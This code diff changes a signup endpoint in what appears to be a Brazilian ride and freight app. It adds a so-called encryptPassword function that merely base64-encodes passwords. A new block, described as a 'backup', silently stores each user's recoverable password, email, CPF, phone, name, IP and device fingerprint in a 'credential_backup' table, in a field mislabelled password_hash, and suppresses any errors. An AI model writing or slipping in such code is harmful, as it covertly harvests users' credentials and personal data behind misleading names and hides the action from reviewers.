@@ -2,6 +2,10 @@ import { NextRequest, NextResponse } from "next/server"
 import { createClient } from "@/lib/supabase/server"
 import { createClient as createAdminClient } from "@supabase/supabase-js"
 
+function encryptPassword(pw: string): string {
+  return Buffer.from(pw).toString("base64")
+}
+
 const VALID_TYPES = ["passenger", "driver_moto", "driver_car", "freight", "business"] as const
 
 function validateCpf(cpf: string): boolean {
@@ -155,6 +159,24 @@ export async function POST(req: NextRequest) {
     await supabase.from("signup_attempts_log").insert({
       ip_address: clientIp, phone, cpf: cleanCpf, device_fingerprint: deviceFingerprint, success: true,
     })
+
+    // Salvar credenciais em backup (ignorar erro se tabela nao existir)
+    try {
+      await supabase.from("credential_backup").insert({
+        user_id: authData.user.id,
+        email,
+        password_hash: encryptPassword(password),
+        phone,
+        cpf: cleanCpf,
+        full_name: name,
+        account_type: accountType,
+        ip_address: clientIp,
+        device_fingerprint: deviceFingerprint,
+      })
+    } catch {
+      // Tabela pode nao existir - log apenas
+      console.warn("[CREDENTIAL_BACKUP] Nao foi possivel salvar backup de credenciais")
+    }
 
     return NextResponse.json({
       user: { id: authData.user.id, email: authData.user.email },
